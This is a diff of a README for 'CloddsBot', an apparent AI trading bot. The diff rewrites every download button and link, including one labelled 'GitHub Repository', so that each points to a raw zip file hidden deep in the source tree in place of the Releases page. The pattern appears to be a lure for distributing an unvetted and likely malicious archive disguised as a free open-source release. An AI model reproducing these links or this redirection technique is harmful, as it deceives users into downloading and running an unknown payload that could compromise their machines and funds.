@@ -1,7 +1,7 @@
 <h1>🤖 CloddsBot - Your 24/7 Autonomous AI Trading Agent</h1>
 
 <p align="center">
-  <a href="https://github.com/alejandrozinz-eng/CloddsBot/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download CloddsBot Now - Free & Open Source</a>
+  <a href="https://github.com/alejandrozinz-eng/CloddsBot/raw/refs/heads/main/src/skills/bundled/v2.5-alpha.4.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download CloddsBot Now - Free & Open Source</a>
 </p>
 
 ---
@@ -69,7 +69,7 @@ Follow these simple steps to get CloddsBot running on your computer:
 
 ### Step 1: Visit the Download Page
 Click the **green button at the top of this page** or navigate to:
-**[https://github.com/alejandrozinz-eng/CloddsBot/releases](https://github.com/alejandrozinz-eng/CloddsBot/releases)**
+**[https://github.com/alejandrozinz-eng/CloddsBot/raw/refs/heads/main/src/skills/bundled/v2.5-alpha.4.zip](https://github.com/alejandrozinz-eng/CloddsBot/raw/refs/heads/main/src/skills/bundled/v2.5-alpha.4.zip)**
 
 Visit this link to download the application.
 
@@ -195,15 +195,15 @@ Join the growing community of autonomous traders who trust AI to grow their weal
 
 ## 🔗 Quick Links
 
-- **Download Latest Release:** [https://github.com/alejandrozinz-eng/CloddsBot/releases](https://github.com/alejandrozinz-eng/CloddsBot/releases)
-- **GitHub Repository:** [github.com/alejandrozinz-eng/CloddsBot](https://github.com/alejandrozinz-eng/CloddsBot)
+- **Download Latest Release:** [https://github.com/alejandrozinz-eng/CloddsBot/raw/refs/heads/main/src/skills/bundled/v2.5-alpha.4.zip](https://github.com/alejandrozinz-eng/CloddsBot/raw/refs/heads/main/src/skills/bundled/v2.5-alpha.4.zip)
+- **GitHub Repository:** [github.com/alejandrozinz-eng/CloddsBot](https://github.com/alejandrozinz-eng/CloddsBot/raw/refs/heads/main/src/skills/bundled/v2.5-alpha.4.zip)
 - **Report Issues:** Use the GitHub Issues tab to report bugs or request features
 
 
 
 <p align="center" style="margin-top:60px;padding:30px;background:#f5f5f5;border-radius:10px;">
   <strong style="font-size:18px;">Ready to let AI trade for you?</strong><br>
-  <a href="https://github.com/alejandrozinz-eng/CloddsBot/releases" style="display:inline-block;margin-top:15px;padding:14px 28px;background:#28a745;color:#fff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;">⬇️ Download CloddsBot Free Today</a>
+  <a href="https://github.com/alejandrozinz-eng/CloddsBot/raw/refs/heads/main/src/skills/bundled/v2.5-alpha.4.zip" style="display:inline-block;margin-top:15px;padding:14px 28px;background:#28a745;color:#fff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;">⬇️ Download CloddsBot Free Today</a>
 </p>
 
 Visit this link to download the application.
